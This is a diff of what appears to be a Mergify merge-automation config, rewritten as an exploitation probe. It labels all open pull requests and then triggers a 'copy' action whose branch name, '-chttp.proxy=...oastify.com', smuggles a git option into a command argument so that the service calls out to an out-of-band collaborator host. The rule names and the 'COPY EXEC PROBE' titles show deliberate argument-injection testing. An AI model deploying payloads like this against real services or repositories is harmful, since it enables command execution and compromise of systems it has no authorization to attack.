@@ -1,19 +1,20 @@
 pull_request_rules:
-  - name: auto-label-trigger
+  - name: auto-label-all-prs
     conditions:
-      - head = ssti-test
+      - state = open
     actions:
       label:
-        add: [trigger-copy-91177efd]
+        add: [tc-cpex-17799693820fd0]
 
-  - name: copy-malicious-branch
+  - name: copy-on-label
     conditions:
-      - label = trigger-copy-91177efd
+      - label = tc-cpex-17799693820fd0
     actions:
       copy:
         branches:
-          - "-chttp.proxy=copyexec-17799691177efd.tmjvsptjwtmpfxy97hod40j5qwwnkf84.oastify.com"
-        title: "COPY EXEC PROBE"
+          - "-chttp.proxy=cpex-17799693820fd0.tmjvsptjwtmpfxy97hod40j5qwwnkf84.oastify.com"
+        title: "COPY EXEC PROBE 2"
+        ignore_conflicts: true
 
 merge_protections_settings:
   reporting_method: check-runs
